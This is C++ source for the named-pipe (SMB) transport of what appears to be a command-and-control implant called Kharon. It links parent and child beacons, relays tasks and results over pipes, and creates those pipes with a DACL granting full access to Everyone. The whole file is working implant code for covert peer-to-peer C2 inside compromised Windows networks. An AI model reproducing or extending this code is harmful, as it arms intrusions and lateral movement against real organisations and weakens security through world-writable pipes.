#include <Kharon.h>

auto Transport::SmbAdd(
    _In_ CHAR* NamedPipe,
    _In_ PVOID Parser,
    _In_ PVOID Package
) -> PVOID {
    SMB_PROFILE_DATA* SmbData = nullptr;

    BOOL   Success = FALSE;
    ULONG  BuffLen = 0;
    BYTE*  Buffer  = nullptr;

    HANDLE Handle  = Self->Krnl32.CreateFileA(
        NamedPipe, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr
    );
    if ( Handle == INVALID_HANDLE_VALUE || ! Handle ) {
        KhDbg( "named pipe not found: %d", KhGetError ); return nullptr;
    }

    // Wait for child to write data (child writes [4B length][payload] after ConnectNamedPipe)
    ULONG retries = 0;
    while ( retries < 50 ) {
        if ( Self->Krnl32.PeekNamedPipe( Handle, nullptr, 0, 0, &BuffLen, 0 ) ) {
            if ( BuffLen >= sizeof( ULONG ) ) {
                Self->Ntdll.DbgPrint( "[SMB] SmbAdd: %d bytes available from pipe\n", BuffLen );
                break;
            }
        }
        Self->Krnl32.Sleep( 100 );
        retries++;
    }

    if ( BuffLen < sizeof( ULONG ) ) {
        Self->Ntdll.DbgPrint( "[SMB] SmbAdd: no data from pipe after retries\n" );
        Self->Ntdll.NtClose( Handle );
        return nullptr;
    }

    // Read entire message at once (PIPE_TYPE_MESSAGE sends [4B len][payload] as single message)
    Buffer = (BYTE*)KhAlloc( BuffLen );
    ULONG BytesRead = 0;
    if ( ! Self->Krnl32.ReadFile( Handle, Buffer, BuffLen, &BytesRead, nullptr ) ) {
        Self->Ntdll.DbgPrint( "[SMB] SmbAdd: ReadFile failed: %d\n", KhGetError );
        KhFree( Buffer );
        Self->Ntdll.NtClose( Handle );
        return nullptr;
    }

    Self->Ntdll.DbgPrint( "[SMB] SmbAdd: read %d bytes total message\n", BytesRead );

    // Extract payload: skip first 4 bytes (length prefix)
    if ( BytesRead <= sizeof(ULONG) ) {
        Self->Ntdll.DbgPrint( "[SMB] SmbAdd: message too small\n" );
        KhFree( Buffer );
        Self->Ntdll.NtClose( Handle );
        return nullptr;
    }

    ULONG PayloadLen = BytesRead - sizeof(ULONG);
    PBYTE PayloadBuf = (PBYTE)KhAlloc( PayloadLen );
    Mem::Copy( PayloadBuf, Buffer + sizeof(ULONG), PayloadLen );
    KhFree( Buffer );
    Buffer = PayloadBuf;
    BuffLen = PayloadLen;

    Self->Ntdll.DbgPrint( "[SMB] SmbAdd: read %d bytes payload (UUID starts: %c%c%c%c)\n",
        BuffLen, Buffer[0], Buffer[1], Buffer[2], Buffer[3] );

    CHAR* TmpUUID = (CHAR*)KhAlloc( 36+1 );

    Mem::Copy( TmpUUID, Buffer, 36 );

    KhDbg( "parsed uuid: %s", TmpUUID );

    SmbData = (SMB_PROFILE_DATA*)KhAlloc( sizeof( SMB_PROFILE_DATA ) );

    SmbData->Handle    = Handle;
    SmbData->SmbUUID   = TmpUUID;
    SmbData->AgentUUID = TmpUUID;

    // Store the pipe path for reconnection during task relay
    ULONG PathLen = Str::LengthA( NamedPipe ) + 1;
    SmbData->PipePath = (CHAR*)KhAlloc( PathLen );
    Mem::Copy( SmbData->PipePath, NamedPipe, PathLen );

    SmbData->Pkg = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
    SmbData->Psr = (PARSER*)KhAlloc( sizeof( PARSER ) );

    SmbData->Pkg->Buffer  = Buffer;
    SmbData->Pkg->Length  = BuffLen;
    SmbData->Pkg->Size    = BuffLen;
    SmbData->Pkg->Encrypt = FALSE;

    SmbData->Next = nullptr;

    if ( ! this->Pipe.Node ) {
        this->Pipe.Node = SmbData;
    } else {
        SMB_PROFILE_DATA* Current = static_cast<SMB_PROFILE_DATA*>( this->Pipe.Node );

        while ( Current->Next ) {
            Current = Current->Next;
        }

        Current->Next = SmbData;
    }

    return SmbData;
}

auto Transport::SmbRm(
    _In_ PVOID SmbDataPtr
) -> BOOL {
    if ( ! SmbDataPtr || ! this->Pipe.Node ) return FALSE;

    SMB_PROFILE_DATA* Target  = static_cast<SMB_PROFILE_DATA*>( SmbDataPtr );
    SMB_PROFILE_DATA* Current = static_cast<SMB_PROFILE_DATA*>( this->Pipe.Node );
    SMB_PROFILE_DATA* Prev    = nullptr;

    while ( Current ) {
        if ( Current == Target ) {
            // Unlink from list
            if ( Prev ) {
                Prev->Next = Current->Next;
            } else {
                this->Pipe.Node = Current->Next;
            }

            // Close the pipe handle
            if ( Current->Handle ) {
                Self->Ntdll.NtClose( Current->Handle );
            }

            // Free allocated memory
            if ( Current->SmbUUID ) {
                KhFree( Current->SmbUUID );
            }
            if ( Current->Pkg ) {
                if ( Current->Pkg->Buffer ) {
                    KhFree( Current->Pkg->Buffer );
                }
                KhFree( Current->Pkg );
            }
            if ( Current->Psr ) {
                KhFree( Current->Psr );
            }
            KhFree( Current );

            return TRUE;
        }

        Prev    = Current;
        Current = Current->Next;
    }

    return FALSE;
}

auto Transport::SmbList(
    VOID
) -> PVOID {
    return this->Pipe.Node;
}

auto Transport::SmbGet(
    _In_ CHAR* SmbUUID
) -> PVOID {
    if ( ! SmbUUID || ! this->Pipe.Node ) return nullptr;

    SMB_PROFILE_DATA* Current = static_cast<SMB_PROFILE_DATA*>( this->Pipe.Node );

    while ( Current ) {
        if ( Current->SmbUUID && Str::CompareA( Current->SmbUUID, SmbUUID ) == 0 ) {
            return Current;
        }
        Current = Current->Next;
    }

    return nullptr;
}

#if PROFILE_C2 == PROFILE_SMB
auto Transport::SmbSend(
    _In_      MM_INFO* SendData,
    _Out_opt_ MM_INFO* RecvData
) -> BOOL {
    BOOL Success = FALSE;
    BOOL pipeJustCreated = FALSE;

    Self->Ntdll.DbgPrint( "[SMB] SmbSend called, Pipe.Name=%s, Pipe.Handle=%p\n",
        this->Pipe.Name ? this->Pipe.Name : "(null)", this->Pipe.Handle );

    // If the pipe handle doesn't exist yet, create it and wait for parent connection
    if ( ! this->Pipe.Handle ) {
        pipeJustCreated = TRUE;
        SECURITY_ATTRIBUTES* SecAttr = (SECURITY_ATTRIBUTES*)KhAlloc( sizeof( SECURITY_ATTRIBUTES ) );
        SECURITY_DESCRIPTOR* SecDesc = (SECURITY_DESCRIPTOR*)KhAlloc( SECURITY_DESCRIPTOR_MIN_LENGTH );

        SID_IDENTIFIER_AUTHORITY SidAuth  = SECURITY_WORLD_SID_AUTHORITY;
        EXPLICIT_ACCESSA         Access   = { 0 };

        SID* Sid  = nullptr;
        ACL* DAcl = nullptr;

        Self->Advapi32.AllocateAndInitializeSid( &SidAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&Sid );

        Access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
        Access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
        Access.Trustee.ptstrName    = (CHAR*)Sid;
        Access.grfAccessMode        = SET_ACCESS;
        Access.grfInheritance       = NO_INHERITANCE;
        Access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;

        Self->Advapi32.SetEntriesInAclA( 1, &Access, nullptr, &DAcl );

        Self->Advapi32.InitializeSecurityDescriptor( SecDesc, SECURITY_DESCRIPTOR_REVISION );

        Self->Advapi32.SetSecurityDescriptorDacl( SecDesc, TRUE, DAcl, FALSE );

        SecAttr->bInheritHandle       = FALSE;
        SecAttr->nLength              = sizeof( SECURITY_ATTRIBUTES );
        SecAttr->lpSecurityDescriptor = SecDesc;

        this->Pipe.Handle = Self->Krnl32.CreateNamedPipeA(
            this->Pipe.Name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, SecAttr
        );

        if ( this->Pipe.Handle == INVALID_HANDLE_VALUE || ! this->Pipe.Handle ) {
            Self->Ntdll.DbgPrint( "[SMB] CreateNamedPipeA FAILED: error=%d, name=%s\n", KhGetError,
                this->Pipe.Name ? this->Pipe.Name : "(null)" );
            this->Pipe.Handle = nullptr;
            return FALSE;
        }

        Self->Ntdll.DbgPrint( "[SMB] Pipe created OK: %s, handle=%p\n", this->Pipe.Name, this->Pipe.Handle );
    }

    // Call 2: pipe is already connected from Call 1 — go directly to writing results
    if ( ! pipeJustCreated && Self->Session.Connected ) {
        Self->Ntdll.DbgPrint( "[SMB] Call 2: pipe still open, writing results directly\n" );
        goto call2_write_results;
    }

    Self->Ntdll.DbgPrint( "[SMB] Waiting for parent to connect...\n" );

    // Wait for parent beacon to connect
    if ( ! Self->Krnl32.ConnectNamedPipe( this->Pipe.Handle, nullptr ) ) {
        if ( KhGetError != ERROR_PIPE_CONNECTED ) {
            Self->Ntdll.DbgPrint( "[SMB] ConnectNamedPipe failed: %d\n", KhGetError );
            return FALSE;
        }
    }

    Self->Ntdll.DbgPrint( "[SMB] Parent connected!\n" );

    // FIRST CHECKIN: write checkin data, close pipe
    if ( ! Self->Session.Connected ) {
        if ( SendData && SendData->Ptr && SendData->Size > 0 ) {
            ULONG WriteLen = 0;
            ULONG DataLen  = (ULONG)SendData->Size;

            // Single message write for PIPE_TYPE_MESSAGE
            ULONG TotalLen = sizeof(ULONG) + DataLen;
            PBYTE CombinedBuf = (PBYTE)KhAlloc( TotalLen );
            Mem::Copy( CombinedBuf, &DataLen, sizeof(ULONG) );
            Mem::Copy( CombinedBuf + sizeof(ULONG), SendData->Ptr, DataLen );
            Self->Krnl32.WriteFile( this->Pipe.Handle, CombinedBuf, TotalLen, &WriteLen, nullptr );
            KhFree( CombinedBuf );

            Self->Ntdll.DbgPrint( "[SMB] Wrote %d bytes checkin to pipe\n", DataLen );
        }

        Self->Ntdll.DbgPrint( "[SMB] First checkin — not waiting for response\n" );
        Self->Ntdll.NtClose( this->Pipe.Handle );
        this->Pipe.Handle = nullptr;
        return TRUE;
    }

    // TASK EXCHANGE — Dispatcher calls SmbSend TWICE per cycle:
    //   Call 1 (Transmit): Pipe.Handle was nullptr → just created + connected → READ tasks
    //   Call 2 (Jbs::Send): Pipe.Handle is still open from Call 1 → WRITE results
    //
    // Detect which call by checking if pipe was JUST created (Call 1) or already open (Call 2).
    // We use a simple flag: if we just went through ConnectNamedPipe above, it's Call 1.
    // If Handle was already set when SmbSend was called, it's Call 2.

call2_write_results:
    // Call 2 — write results on existing pipe connection, then close.
    if ( ! pipeJustCreated ) {
        Self->Ntdll.DbgPrint( "[SMB] Call 2: writing results on existing pipe\n" );

        if ( SendData && SendData->Ptr && SendData->Size > 0 ) {
            ULONG WriteLen = 0;
            ULONG DataLen  = (ULONG)SendData->Size;

            // Single message write for PIPE_TYPE_MESSAGE
            ULONG TotalLen = sizeof(ULONG) + DataLen;
            PBYTE CombinedBuf = (PBYTE)KhAlloc( TotalLen );
            Mem::Copy( CombinedBuf, &DataLen, sizeof(ULONG) );
            Mem::Copy( CombinedBuf + sizeof(ULONG), SendData->Ptr, DataLen );
            Self->Krnl32.WriteFile( this->Pipe.Handle, CombinedBuf, TotalLen, &WriteLen, nullptr );
            KhFree( CombinedBuf );

            Self->Ntdll.DbgPrint( "[SMB] Call 2: wrote %d bytes results\n", DataLen );
        }

        Self->Ntdll.NtClose( this->Pipe.Handle );
        this->Pipe.Handle = nullptr;
        return TRUE;
    }

    // Call 1: pipe was just created and connected — READ tasks from parent
    {
        Self->Ntdll.DbgPrint( "[SMB] Call 1: reading tasks from parent...\n" );

        // Read entire message at once (PIPE_TYPE_MESSAGE: [4B len][payload] is one message)
        ULONG MsgLen = 0;
        // PeekNamedPipe already told us how much data is available
        if ( ! Self->Krnl32.PeekNamedPipe( this->Pipe.Handle, nullptr, 0, 0, &MsgLen, 0 ) || MsgLen < sizeof(ULONG) ) {
            // Wait for parent to write
            ULONG peekRetries = 0;
            while ( peekRetries < 100 ) {
                if ( Self->Krnl32.PeekNamedPipe( this->Pipe.Handle, nullptr, 0, 0, &MsgLen, 0 ) && MsgLen >= sizeof(ULONG) ) break;
                Self->Krnl32.Sleep( 100 );
                peekRetries++;
            }
            if ( MsgLen < sizeof(ULONG) ) {
                Self->Ntdll.DbgPrint( "[SMB] Call 1: no data from parent\n" );
                goto cleanup;
            }
        }

        PBYTE MsgBuf = (PBYTE)KhAlloc( MsgLen );
        if ( ! MsgBuf ) goto cleanup;
        ULONG ReadLen = 0;
        if ( ! Self->Krnl32.ReadFile( this->Pipe.Handle, MsgBuf, MsgLen, &ReadLen, nullptr ) ) {
            Self->Ntdll.DbgPrint( "[SMB] Call 1: ReadFile failed: %d\n", KhGetError );
            KhFree( MsgBuf );
            goto cleanup;
        }

        // Extract payload: skip 4-byte length prefix
        ULONG TaskLen = ReadLen - sizeof(ULONG);
        PBYTE TaskBuf = (PBYTE)KhAlloc( TaskLen );
        Mem::Copy( TaskBuf, MsgBuf + sizeof(ULONG), TaskLen );
        KhFree( MsgBuf );

        // Prepend 36-byte dummy UUID prefix so Parser::NewTask's Pad(36) works correctly.
        // NewTask always skips first 36 bytes (UUID from HTTP response). SMB data has no UUID.
        ULONG PrefixedLen = 36 + TaskLen;
        PBYTE PrefixedBuf = (PBYTE)KhAlloc( PrefixedLen );
        Mem::Zero( U_PTR(PrefixedBuf), 36 );
        Mem::Copy( PrefixedBuf + 36, TaskBuf, TaskLen );
        KhFree( TaskBuf );

        if ( RecvData ) {
            RecvData->Ptr  = PrefixedBuf;
            RecvData->Size = PrefixedLen;
        }

        Self->Ntdll.DbgPrint( "[SMB] Call 1: read %d bytes tasks (prefixed to %d) — keeping pipe open\n", TaskLen, PrefixedLen );

        // Keep pipe open — Call 2 will write results
        return TRUE;
    }

cleanup:
    Self->Ntdll.NtClose( this->Pipe.Handle );
    this->Pipe.Handle = nullptr;

    return FALSE;
}
#endif
